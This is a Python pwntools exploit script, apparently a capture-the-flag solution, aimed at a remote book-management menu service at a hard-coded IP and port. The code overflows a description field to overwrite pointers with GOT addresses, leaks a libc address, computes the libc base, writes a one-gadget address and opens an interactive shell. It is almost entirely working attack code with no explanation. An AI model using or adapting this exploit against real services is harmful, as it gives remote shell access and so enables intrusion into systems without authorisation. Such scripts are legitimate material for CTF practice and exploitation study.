from pwn import *

#s = remote('192.168.32.180',1234)
s = remote('139.59.244.42', 31340)
def add_book(name,author,size,dat):
  s.recvuntil('Choice:')
  s.sendline('1')
  s.recvuntil('name:')
  s.send(name)
  s.recvuntil('Author:')
  s.send(author)
  s.recvuntil('Length of Description:')
  s.sendline(str(size))
  s.recvuntil('Description:')
  s.send(dat)
raw_input()
add_book("A"*0x20,"A"*0x20,0x4,"A"*4)
s.recvuntil('Choice:')
s.sendline('2')
s.recvuntil('?')
s.sendline('1')
s.recvuntil('name:')
s.send('AAAA\x00\n')
s.recvuntil('Author:')
s.send('AAAA\x00\n')
s.recvuntil('Description:')
s.send('A'*(0xe7)+'\x00'+p32(2)+p64(0x602018)+p64(0x602020)+'\n')
s.recvuntil('Choice:')
s.sendline('4')
libc = u64(s.recvuntil('Author')[-13:-7]+'\x00\x00') - 0xa59d0
log.info("LIBC : 0x%x"%libc)
s.sendline('2')
s.recvuntil('?')
s.sendline('2')
s.recvuntil('name:')
s.sendline(p64(libc+0xf0274))
s.interactive()
